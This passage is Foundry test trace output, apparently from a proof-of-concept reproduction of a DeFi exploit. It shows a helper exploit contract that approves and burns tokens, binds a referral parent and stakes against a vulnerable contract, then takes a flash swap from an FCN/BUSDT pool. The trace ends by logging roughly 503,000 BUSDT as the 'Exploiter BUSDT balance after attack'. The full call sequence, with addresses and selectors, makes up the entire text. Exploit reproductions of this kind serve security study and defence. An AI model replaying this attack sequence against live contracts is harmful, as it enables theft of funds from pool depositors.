    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   ├─ [11093] FCN::burnFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 31314272511869 [3.131e13])
    │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: vulnContract: [0x431Abb27dAB05f4E7cDeAA18390fE39364197500], value: 115792089237316195423570985008687907853269984665640564039457583976598857128066 [1.157e77])
    │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, value: 31314272511869 [3.131e13])
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   ├─ [557] BindingContract::getParent(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   └─ ← [Return] 0x000000000000000000000000041285a02a7fabc448893f6c1766e4b592f46f96
    │   ├─ [557] BindingContract::getParent(addrToBind: [0x041285A02A7fabc448893f6c1766e4B592f46f96]) [staticcall]
    │   │   └─ ← [Return] 0x00000000000000000000000092d922a6dc00ea06ac03a3f52ba7646db50dccdc
    │   ├─ [2557] BindingContract::getParent(0x92d922A6dc00Ea06ac03a3f52bA7646db50dccdc) [staticcall]
    │   │   └─ ← [Return] 0x000000000000000000000000cecb91a9a60bb31e0d90f6151a4d0e98f834c4f5
    │   ├─ [2557] BindingContract::getParent(0xCecB91a9A60bb31e0d90f6151A4d0E98F834c4F5) [staticcall]
    │   │   └─ ← [Return] 0x000000000000000000000000eb685017d672921e01b4008550e4bef371081b5b
    │   ├─ [2557] BindingContract::getParent(0xEb685017d672921E01B4008550e4BeF371081b5b) [staticcall]
    │   │   └─ ← [Return] 0x000000000000000000000000fa3520750ff9ab1d4f21ffe2f414154d3ef61129
    │   ├─ [2557] BindingContract::getParent(0xfA3520750ff9Ab1d4F21FfE2F414154d3Ef61129) [staticcall]
    │   │   └─ ← [Return] 0x00000000000000000000000025346eff782be12c49451833a2460ba0da294b9c
    │   ├─ [2557] BindingContract::getParent(0x25346eFF782bE12c49451833a2460ba0dA294b9C) [staticcall]
    │   │   └─ ← [Return] 0x00000000000000000000000013be0c0cb2fa1d3ee90415d00379cc8ed84639eb
    │   ├─ [2557] BindingContract::getParent(0x13Be0C0cB2FA1D3eE90415d00379Cc8Ed84639eB) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000641720e05728524251ad1afc5808d09bf882717
    │   ├─ [2557] BindingContract::getParent(0x0641720e05728524251AD1afC5808d09bF882717) [staticcall]
    │   │   └─ ← [Return] 0x00000000000000000000000090d3dc61b72769ea839963be697299f8924e5611
    │   ├─ [2557] BindingContract::getParent(0x90D3dC61b72769eA839963bE697299F8924E5611) [staticcall]
    │   │   └─ ← [Return] 0x000000000000000000000000ba782d35df078953aff1f728099448e4dbc136c2
    │   └─ ← [Stop] 
    ├─ [1044104] → new HelperExploitContract@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
    │   └─ ← [Return] 4994 bytes of code
    ├─ [626] KLEN::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 4575272727272727272727 [4.575e21]
    ├─ [33653] KLEN::transfer(HelperExploitContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 2287636363636363636363 [2.287e21])
    │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, value: 457527272727272727260 [4.575e20])
    │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: HelperExploitContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], value: 1830109090909090909103 [1.83e21])
    │   └─ ← [Return] true
    ├─ [626] TRUST::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 438156834204973832 [4.381e17]
    ├─ [32649] TRUST::transfer(HelperExploitContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 219078417102486916 [2.19e17])
    │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: HelperExploitContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], value: 219078417102486916 [2.19e17])
    │   └─ ← [Return] true
    ├─ [648] MDAO::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 2983053025773965817879 [2.983e21]
    ├─ [35534] MDAO::transfer(HelperExploitContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1491526512886982908939 [1.491e21])
    │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, value: 298305302577396581787 [2.983e20])
    │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: HelperExploitContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], value: 1193221210309586327152 [1.193e21])
    │   └─ ← [Return] true
    ├─ [626] FCN::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 158685727488131 [1.586e14]
    ├─ [38912] FCN::transfer(HelperExploitContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 79342863744065 [7.934e13])
    │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: HelperExploitContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], value: 79342863744065 [7.934e13])
    │   └─ ← [Return] true
    ├─ [531] BUSDT::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 1010008559000000000000 [1.01e21]
    ├─ [25171] BUSDT::transfer(HelperExploitContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 505004279500000000000 [5.05e20])
    │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: HelperExploitContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], value: 505004279500000000000 [5.05e20])
    │   └─ ← [Return] true
    ├─ [555756] HelperExploitContract::exploit()
    │   ├─ [24643] KLEN::approve(vulnContract: [0x431Abb27dAB05f4E7cDeAA18390fE39364197500], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   │   ├─ emit Approval(owner: HelperExploitContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], spender: vulnContract: [0x431Abb27dAB05f4E7cDeAA18390fE39364197500], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   │   └─ ← [Return] true
    │   ├─ [24643] TRUST::approve(vulnContract: [0x431Abb27dAB05f4E7cDeAA18390fE39364197500], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   │   ├─ emit Approval(owner: HelperExploitContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], spender: vulnContract: [0x431Abb27dAB05f4E7cDeAA18390fE39364197500], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   │   └─ ← [Return] true
    │   ├─ [24643] MDAO::approve(vulnContract: [0x431Abb27dAB05f4E7cDeAA18390fE39364197500], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   │   ├─ emit Approval(owner: HelperExploitContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], spender: vulnContract: [0x431Abb27dAB05f4E7cDeAA18390fE39364197500], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   │   └─ ← [Return] true
    │   ├─ [24643] FCN::approve(vulnContract: [0x431Abb27dAB05f4E7cDeAA18390fE39364197500], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   │   ├─ emit Approval(owner: HelperExploitContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], spender: vulnContract: [0x431Abb27dAB05f4E7cDeAA18390fE39364197500], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   │   └─ ← [Return] true
    │   ├─ [24562] BUSDT::approve(BUSDT_MetaWin: [0x90bf82c772f16651d6ae51D42c90c84aE703Eb42], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   │   ├─ emit Approval(owner: HelperExploitContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], spender: BUSDT_MetaWin: [0x90bf82c772f16651d6ae51D42c90c84aE703Eb42], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   │   └─ ← [Return] true
    │   ├─ [180360] BUSDT_MetaWin::buy(6069)
    │   │   ├─ [6034] BUSDT::transferFrom(HelperExploitContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0xC927A27b6231783AB75eb60eFb0A3b06b97D0Bff, 42500000000000000000 [4.25e19])
    │   │   │   ├─ emit Transfer(from: HelperExploitContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: 0xC927A27b6231783AB75eb60eFb0A3b06b97D0Bff, value: 42500000000000000000 [4.25e19])
    │   │   │   ├─ emit Approval(owner: HelperExploitContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], spender: BUSDT_MetaWin: [0x90bf82c772f16651d6ae51D42c90c84aE703Eb42], value: 115792089237316195423570985008687907853269984665640564039415084007913129639935 [1.157e77])
    │   │   │   └─ ← [Return] true
    │   │   ├─ [27934] BUSDT::transferFrom(HelperExploitContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0xe6Cc83568bd7F974bFCF270d1f17A73ea2912FC6, 127500000000000000000 [1.275e20])
    │   │   │   ├─ emit Transfer(from: HelperExploitContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: 0xe6Cc83568bd7F974bFCF270d1f17A73ea2912FC6, value: 127500000000000000000 [1.275e20])
    │   │   │   ├─ emit Approval(owner: HelperExploitContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], spender: BUSDT_MetaWin: [0x90bf82c772f16651d6ae51D42c90c84aE703Eb42], value: 115792089237316195423570985008687907853269984665640564039287584007913129639935 [1.157e77])
    │   │   │   └─ ← [Return] true
    │   │   ├─ [124319] 0x238f5426D18e117158dAf175Ad479c6180e88070::9ca89d1c(00000000000000000000000090bf82c772f16651d6ae51d42c90c84ae703eb420000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f00000000000000000000000000000000000000000000000000000000000017b5)
    │   │   │   ├─ emit Approval(_owner: BUSDT_MetaWin: [0x90bf82c772f16651d6ae51D42c90c84aE703Eb42], _approved: 0x0000000000000000000000000000000000000000, _tokenId: 6069)
    │   │   │   ├─ emit Transfer(_from: BUSDT_MetaWin: [0x90bf82c772f16651d6ae51D42c90c84aE703Eb42], _to: HelperExploitContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], _tokenId: 6069)
    │   │   │   └─ ← [Stop] 
    │   │   ├─ emit buyEvent(param0: HelperExploitContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], param1: 6069)
    │   │   └─ ← [Stop] 
    │   ├─ [68771] BindingContract::bindParent(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   │   ├─ emit BingParent(: HelperExploitContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], : ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   │   └─ ← [Stop] 
    │   ├─ [31119] vulnContract::1f6b08a4(0000000000000000000000000000000000000000000000000000000000000001)
    │   │   ├─ [362] 0xe39cdA8ca56589B0429B580b8f942bE6A936c4da::bbe6c24c() [staticcall]
    │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000024a32a033f08000
    │   │   ├─ [6150] KLEN::burnFrom(HelperExploitContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 303030303030303030303 [3.03e20])
    │   │   │   ├─ emit Approval(owner: HelperExploitContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], spender: vulnContract: [0x431Abb27dAB05f4E7cDeAA18390fE39364197500], value: 115792089237316195423570985008687907853269984665640564039154553704882826609632 [1.157e77])
    │   │   │   ├─ emit Transfer(from: HelperExploitContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: 0x0000000000000000000000000000000000000000, value: 303030303030303030303 [3.03e20])
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   └─ ← [Stop] 
    │   ├─ [148141] vulnContract::Stack(200000000000000000000 [2e20])
    │   │   ├─ [727] 0x238f5426D18e117158dAf175Ad479c6180e88070::balanceOf(HelperExploitContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   │   └─ ← [Return] 1
    │   │   ├─ [362] 0xe39cdA8ca56589B0429B580b8f942bE6A936c4da::bbe6c24c() [staticcall]
    │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000024a32a033f08000
    │   │   ├─ [531] BUSDT::balanceOf(0xff77a0B56E45990cF39C2f9bA6bd630F76C395e3) [staticcall]
    │   │   │   └─ ← [Return] 498146142324551248481742 [4.981e23]
    │   │   ├─ [626] TRUST::balanceOf(0xff77a0B56E45990cF39C2f9bA6bd630F76C395e3) [staticcall]
    │   │   │   └─ ← [Return] 1378983220331919441950 [1.378e21]
    │   │   ├─ [626] TRUST::balanceOf(0x1889a1C801B523EBF9C885F22d6b81F149d222Da) [staticcall]
    │   │   │   └─ ← [Return] 4037621732736356690413 [4.037e21]
    │   │   ├─ [648] MDAO::balanceOf(0x1889a1C801B523EBF9C885F22d6b81F149d222Da) [staticcall]
    │   │   │   └─ ← [Return] 56115775657011601778067785 [5.611e25]
    │   │   ├─ [531] BUSDT::balanceOf(FCN_BUSDT: [0xACB496dd4A8b6B9D1B99D422b8700F6EF932Bc10]) [staticcall]
    │   │   │   └─ ← [Return] 512963361056079475662703 [5.129e23]
    │   │   ├─ [626] FCN::balanceOf(FCN_BUSDT: [0xACB496dd4A8b6B9D1B99D422b8700F6EF932Bc10]) [staticcall]
    │   │   │   └─ ← [Return] 501971077397338362 [5.019e17]
    │   │   ├─ [6150] KLEN::burnFrom(HelperExploitContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 969696969696969696969 [9.696e20])
    │   │   │   ├─ emit Approval(owner: HelperExploitContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], spender: vulnContract: [0x431Abb27dAB05f4E7cDeAA18390fE39364197500], value: 115792089237316195423570985008687907853269984665640564038184856735185856912663 [1.157e77])
    │   │   │   ├─ emit Transfer(from: HelperExploitContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: 0x0000000000000000000000000000000000000000, value: 969696969696969696969 [9.696e20])
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   ├─ [6150] TRUST::burnFrom(HelperExploitContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 16609381502749691 [1.66e16])
    │   │   │   ├─ emit Approval(owner: HelperExploitContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], spender: vulnContract: [0x431Abb27dAB05f4E7cDeAA18390fE39364197500], value: 115792089237316195423570985008687907853269984665640564039457567398531626890244 [1.157e77])
    │   │   │   ├─ emit Transfer(from: HelperExploitContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: 0x0000000000000000000000000000000000000000, value: 16609381502749691 [1.66e16])
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   ├─ [6205] MDAO::burnFrom(HelperExploitContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 76946974226034194305 [7.694e19])
    │   │   │   ├─ emit Approval(owner: HelperExploitContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], spender: vulnContract: [0x431Abb27dAB05f4E7cDeAA18390fE39364197500], value: 115792089237316195423570985008687907853269984665640564039380637033687095445630 [1.157e77])
    │   │   │   ├─ emit Transfer(from: HelperExploitContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: 0x0000000000000000000000000000000000000000, value: 76946974226034194305 [7.694e19])
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   ├─ [6293] FCN::burnFrom(HelperExploitContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 31314272511869 [3.131e13])
    │   │   │   ├─ emit Approval(owner: HelperExploitContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], spender: vulnContract: [0x431Abb27dAB05f4E7cDeAA18390fE39364197500], value: 115792089237316195423570985008687907853269984665640564039457583976598857128066 [1.157e77])
    │   │   │   ├─ emit Transfer(from: HelperExploitContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: 0x0000000000000000000000000000000000000000, value: 31314272511869 [3.131e13])
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   ├─ [557] BindingContract::getParent(HelperExploitContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   │   └─ ← [Return] 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
    │   │   ├─ [557] BindingContract::getParent(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   │   └─ ← [Return] 0x000000000000000000000000041285a02a7fabc448893f6c1766e4b592f46f96
    │   │   ├─ [557] BindingContract::getParent(addrToBind: [0x041285A02A7fabc448893f6c1766e4B592f46f96]) [staticcall]
    │   │   │   └─ ← [Return] 0x00000000000000000000000092d922a6dc00ea06ac03a3f52ba7646db50dccdc
    │   │   ├─ [557] BindingContract::getParent(0x92d922A6dc00Ea06ac03a3f52bA7646db50dccdc) [staticcall]
    │   │   │   └─ ← [Return] 0x000000000000000000000000cecb91a9a60bb31e0d90f6151a4d0e98f834c4f5
    │   │   ├─ [557] BindingContract::getParent(0xCecB91a9A60bb31e0d90f6151A4d0E98F834c4F5) [staticcall]
    │   │   │   └─ ← [Return] 0x000000000000000000000000eb685017d672921e01b4008550e4bef371081b5b
    │   │   ├─ [557] BindingContract::getParent(0xEb685017d672921E01B4008550e4BeF371081b5b) [staticcall]
    │   │   │   └─ ← [Return] 0x000000000000000000000000fa3520750ff9ab1d4f21ffe2f414154d3ef61129
    │   │   ├─ [557] BindingContract::getParent(0xfA3520750ff9Ab1d4F21FfE2F414154d3Ef61129) [staticcall]
    │   │   │   └─ ← [Return] 0x00000000000000000000000025346eff782be12c49451833a2460ba0da294b9c
    │   │   ├─ [557] BindingContract::getParent(0x25346eFF782bE12c49451833a2460ba0dA294b9C) [staticcall]
    │   │   │   └─ ← [Return] 0x00000000000000000000000013be0c0cb2fa1d3ee90415d00379cc8ed84639eb
    │   │   ├─ [557] BindingContract::getParent(0x13Be0C0cB2FA1D3eE90415d00379Cc8Ed84639eB) [staticcall]
    │   │   │   └─ ← [Return] 0x0000000000000000000000000641720e05728524251ad1afc5808d09bf882717
    │   │   ├─ [557] BindingContract::getParent(0x0641720e05728524251AD1afC5808d09bF882717) [staticcall]
    │   │   │   └─ ← [Return] 0x00000000000000000000000090d3dc61b72769ea839963be697299f8924e5611
    │   │   └─ ← [Stop] 
    │   └─ ← [Stop] 
    ├─ [0] VM::roll(33972130 [3.397e7])
    │   └─ ← [Return] 
    ├─ [531] BUSDT::balanceOf(FCN_BUSDT: [0xACB496dd4A8b6B9D1B99D422b8700F6EF932Bc10]) [staticcall]
    │   └─ ← [Return] 512963361056079475662703 [5.129e23]
    ├─ [100507] FCN_BUSDT::swap(0, 512963341056079475662703 [5.129e23], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x0000000000000000000000000000000000000000000000000000000000000000)
    │   ├─ [6071] BUSDT::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 512963341056079475662703 [5.129e23])
    │   │   ├─ emit Transfer(from: FCN_BUSDT: [0xACB496dd4A8b6B9D1B99D422b8700F6EF932Bc10], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 512963341056079475662703 [5.129e23])
    │   │   └─ ← [Return] true
    │   ├─ [57402] ContractTest::pancakeCall(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0, 512963341056079475662703 [5.129e23], 0x0000000000000000000000000000000000000000000000000000000000000000)
    │   │   ├─ [36694] vulnContract::d9574d4c()
    │   │   │   ├─ [531] BUSDT::balanceOf(FCN_BUSDT: [0xACB496dd4A8b6B9D1B99D422b8700F6EF932Bc10]) [staticcall]
    │   │   │   │   └─ ← [Return] 20000000000000000 [2e16]
    │   │   │   ├─ [626] FCN::balanceOf(FCN_BUSDT: [0xACB496dd4A8b6B9D1B99D422b8700F6EF932Bc10]) [staticcall]
    │   │   │   │   └─ ← [Return] 501971077397338362 [5.019e17]
    │   │   │   ├─ [13812] FCN::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 225886984828802268274 [2.258e20])
    │   │   │   │   ├─ emit Transfer(from: vulnContract: [0x431Abb27dAB05f4E7cDeAA18390fE39364197500], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 225886984828802268274 [2.258e20])
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [13812] FCN::transfer(0x19C4a6b4AbFe88161F07C4fA2229a4120ACFd7d5, 25098553869866918697 [2.509e19])
    │   │   │   │   ├─ emit Transfer(from: vulnContract: [0x431Abb27dAB05f4E7cDeAA18390fE39364197500], to: 0x19C4a6b4AbFe88161F07C4fA2229a4120ACFd7d5, value: 25098553869866918697 [2.509e19])
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [3271] BUSDT::transfer(FCN_BUSDT: [0xACB496dd4A8b6B9D1B99D422b8700F6EF932Bc10], 10000000000000000000000 [1e22])
    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: FCN_BUSDT: [0xACB496dd4A8b6B9D1B99D422b8700F6EF932Bc10], value: 10000000000000000000000 [1e22])
    │   │   │   └─ ← [Return] true
    │   │   ├─ [15385] FCN::transfer(FCN_BUSDT: [0xACB496dd4A8b6B9D1B99D422b8700F6EF932Bc10], 100000000000000000000 [1e20])
    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, value: 15000000000000000000 [1.5e19])
    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: FCN_BUSDT: [0xACB496dd4A8b6B9D1B99D422b8700F6EF932Bc10], value: 85000000000000000000 [8.5e19])
    │   │   │   └─ ← [Return] true
    │   │   └─ ← [Stop] 
    │   ├─ [626] FCN::balanceOf(FCN_BUSDT: [0xACB496dd4A8b6B9D1B99D422b8700F6EF932Bc10]) [staticcall]
    │   │   └─ ← [Return] 85501971077397338362 [8.55e19]
    │   ├─ [531] BUSDT::balanceOf(FCN_BUSDT: [0xACB496dd4A8b6B9D1B99D422b8700F6EF932Bc10]) [staticcall]
    │   │   └─ ← [Return] 10000020000000000000000 [1e22]
    │   ├─ emit Sync(reserve0: 85501971077397338362 [8.55e19], reserve1: 10000020000000000000000 [1e22])
    │   ├─ emit Swap(sender: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount0In: 85000000000000000000 [8.5e19], amount1In: 10000000000000000000000 [1e22], amount0Out: 0, amount1Out: 512963341056079475662703 [5.129e23], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   └─ ← [Stop] 
    ├─ [531] BUSDT::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 503468345335579475662703 [5.034e23]
    ├─ [425] BUSDT::decimals() [staticcall]
    │   └─ ← [Return] 18
    ├─ emit log_named_decimal_uint(key: "Exploiter BUSDT balance after attack", val: 503468345335579475662703 [5.034e23], decimals: 18)
    ├─ [626] FCN::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 125887064171666012340 [1.258e20]
    ├─ [295] FCN::decimals() [staticcall]
    │   └─ ← [Return] 18
    ├─ emit log_named_decimal_uint(key: "Exploiter FCN balance after attack", val: 125887064171666012340 [1.258e20], decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 286.50ms (11.14ms CPU time)

Ran 2 test suites in 525.79ms (502.76ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
